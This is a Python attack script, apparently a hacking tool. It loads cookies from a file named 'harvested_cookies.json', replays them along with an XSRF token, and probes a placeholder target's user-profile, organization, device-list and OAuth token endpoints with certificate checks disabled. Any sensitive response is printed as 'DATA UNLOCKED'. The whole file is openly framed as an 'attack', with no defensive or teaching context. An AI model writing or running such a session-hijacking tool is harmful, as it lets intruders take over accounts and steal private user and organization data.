import json
import httpx
import warnings

warnings.filterwarnings("ignore")

COOKIE_FILE = "harvested_cookies.json"
TARGET_DOMAIN = "yourtarget.com"

def fuzz_with_sni():
    print(f"[*] Initializing SNI-Corrected Edge Attack against {TARGET_DOMAIN}...")
    
    try:
        with open(COOKIE_FILE, "r", encoding="utf-8") as f:
            cookies_list = json.load(f)
    except Exception as e:
        print(f"[!] Error loading {COOKIE_FILE}: {e}")
        return
        
    cookie_jar = {c['name']: c['value'] for c in cookies_list}
    xsrf_token = cookie_jar.get("XSRF-TOKEN", "")
    
    # Using standard domain routing ensures SNI is automatically sent in the TLS ClientHello
    client = httpx.Client(verify=False, timeout=10.0, follow_redirects=False, cookies=cookie_jar)
    
    base_url = f"https://{TARGET_DOMAIN}"
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "X-Requested-With": "XMLHttpRequest"
    }
    
    if xsrf_token:
        headers["X-XSRF-TOKEN"] = xsrf_token
        
    # High-value API route targets
    targets = [
        "/user-center/api/v1/users/profile",
        "/user-center/api/v1/organizations/current",
        "/user-center/api/v1/devices/list",
        "/api/v1/user",
        "/oauth2/v1/token",
        "/",
        "/health",
        "/status"
    ]
    
    print(f"[+] Probing {len(targets)} paths with proper SNI handshake...\n")
    
    for path in targets:
        url = base_url + path
        try:
            res = client.get(url, headers=headers)
            print(f"    -> GET {path} | Status: {res.status_code} | Length: {len(res.text)}")
            if res.status_code == 200 and len(res.text) > 0 and len(res.text) != 717:
                print(f"        [***] PAY DIRT! DATA UNLOCKED:\n{res.text[:400]}\n")
            elif res.status_code == 200:
                print(f"        [-] 200 OK (Empty or shell)")
            elif res.status_code == 404:
                print(f"        [-] 404 Not Found")
        except httpx.RequestError as e:
            print(f"    -> Connection Error on {path}: {e}")
            
    client.close()
    print("\n[*] SNI-corrected attack cycle complete.")

if __name__ == "__main__":
    fuzz_with_sni()
